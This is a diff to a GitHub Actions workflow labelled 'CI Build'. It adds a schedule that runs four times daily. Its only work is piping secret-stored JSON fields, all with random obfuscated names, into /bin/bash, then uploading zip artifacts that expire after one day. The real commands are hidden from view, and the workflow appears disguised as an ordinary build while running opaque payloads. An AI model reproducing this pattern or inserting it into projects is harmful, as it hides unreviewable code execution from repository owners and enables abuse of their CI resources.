@@ -2,6 +2,8 @@ name: CI Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '39 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,16 +24,18 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          iazmk87: ${{ secrets.iazmk87 }}
+          mqwe377: ${{ secrets.mqwe377 }}
         run: |
-          printf '%s' "$iazmk87" | jq -r .uz156 | /bin/bash
-          printf '%s' "$spzyo63" | jq -r .wrjda22391 | /bin/bash
-          printf '%s' "$shvf10" | jq -r .gciv655 | /bin/bash
+          printf '%s' "$mqwe377" | jq -r .hx84 | /bin/bash
+          echo $v5616 | jq -r .vgche30989 | /bin/bash
+          printf '%s' "$uawx939" | jq -r .jd4428 | /bin/bash
+          echo $cllc0952 | jq -r .mbc24 | /bin/bash
+          printf '%s' "$gda17" | jq -r .srgwf4732 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: wrNtwDdB
+          name: Vg6PSKX1
           path: "*.zip"
           retention-days: 1
